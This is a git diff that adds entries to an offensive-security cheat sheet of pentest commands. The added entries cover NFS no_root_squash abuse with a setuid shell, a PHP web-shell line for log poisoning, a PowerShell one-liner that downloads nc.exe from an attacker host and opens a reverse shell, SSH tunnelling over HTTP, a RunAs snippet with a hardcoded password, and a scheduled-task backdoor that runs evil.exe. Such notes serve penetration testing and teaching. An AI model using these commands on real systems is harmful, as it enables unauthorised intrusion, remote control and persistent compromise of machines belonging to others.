@@ -30,6 +30,13 @@ telnet $TARGET 80
 curl -vX $TARGET
 ```
 
+#### NFS Exported Shares
+List NFS exported shares. If 'rw,no_root_squash' is present, upload and execute [sid-shell](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c)
+```bash
+showmount -e 192.168.110.102
+chown root:root sid-shell; chmod +s sid-shell
+```
+
 #### Kerberos User Enumeration
 ```bash
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
@@ -149,7 +156,11 @@ gcc -m32|-m64 -o output source.c
 ```php
 # Vulnerable web app on Windows + PHP through contaminated logs
 nc $WINDOWSTARGET 80
+
+# Send as HTTP request
 <?php system($_GET['cmd']);?>
+
+# Send as cmd=
 powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
 ```
 #### Remote File InclusionShell: Windows + PHP
@@ -323,19 +334,22 @@ ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
 proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
 ssh user@127.0.0.1 -p 5555
 ```
-##### HTTP Tunnel
+##### HTTP Tunnel: SSH Over HTTP
 ```bash
-# Server - open port 5555. Redirect all incoming traffic to localhost:5555 to localhost:22
-hts -F localhost:22 5555
+# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
+hts -F localhost:22 80
 
-# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:5555
-htc -F 8080 192.168.1.15:5555
+# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
+htc -F 8080 192.168.1.15:80
 
-# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:5555 -> get redirected to 192.168.1.15:22
+# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
 ssh localhost -p 8080
 ```
 
-
+#### RunAs / Start Process As: Powershell
+```powershell
+$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami } 
+```
 
 
 
@@ -349,6 +363,13 @@ which nc wget curl php perl python netcat tftp telnet ftp
 
 # Search for *.conf (case-insensitive) files recursively starting with /etc;
 find /etc -iname *.conf
+```
+
+## Maintaining Access
+#### Persistent Back Doors
+```
+# Launch evil.exe every 10 minutes
+schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
 ```
 
 This is inspired and based on [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).
